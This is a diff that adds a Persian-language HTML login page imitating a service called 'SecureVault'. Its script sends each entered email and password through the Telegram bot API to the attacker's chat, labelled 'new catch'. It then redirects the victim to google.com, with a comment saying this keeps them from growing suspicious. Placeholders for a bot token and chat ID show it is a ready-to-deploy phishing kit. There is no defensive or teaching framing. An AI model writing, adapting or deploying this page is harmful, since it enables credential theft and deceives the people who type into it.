@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ورود به SecureVault</title>
+<style>
+  body { font-family: Tahoma, sans-serif; background: #F3F4F6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+  .card { background: white; padding: 40px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
+  h2 { text-align: center; color: #111827; margin-bottom: 24px; }
+  input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-family: inherit; font-size: 15px; }
+  button { width: 100%; padding: 14px; background: #4F46E5; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; margin-top: 15px; font-weight: bold; }
+  button:hover { background: #4338CA; }
+</style>
+</head>
+<body>
+  <div class="card">
+    <h2>ورود به حساب</h2>
+    <form id="loginForm">
+      <input type="email" id="username" placeholder="ایمیل خود را وارد کنید" required>
+      <input type="password" id="password" placeholder="رمز عبور" required>
+      <button type="submit">ورود</button>
+    </form>
+  </div>
+
+<script>
+  document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    // ⚠️ توکن ربات و آیدی خودت رو اینجا بذار
+    const botToken = 'توکن_ربات_خودت_رو_اینجا_بذار';
+    const chatId = 'آیدی_عددی_خودت_رو_اینجا_بذار';
+    
+    const user = document.getElementById('username').value;
+    const pass = document.getElementById('password').value;
+    
+    // متن پیام برای تلگرام
+    const message = `🎣 شکار جدید!\n\n📧 ایمیل: ${user}\n🔑 رمز: ${pass}`;
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+    
+    // ارسال به تلگرام
+    fetch(url)
+      .then(() => {
+        alert('اطلاعات ثبت شد. (برای دیدن به تلگرام بروید)');
+        window.location.href = 'https://google.com'; // برای اینکه طرف شک نکنه
+      })
+      .catch((err) => {
+        alert('خطا در ارسال! اینترنت رو چک کنید.');
+      });
+  });
+</script>
+</body>
+</html>
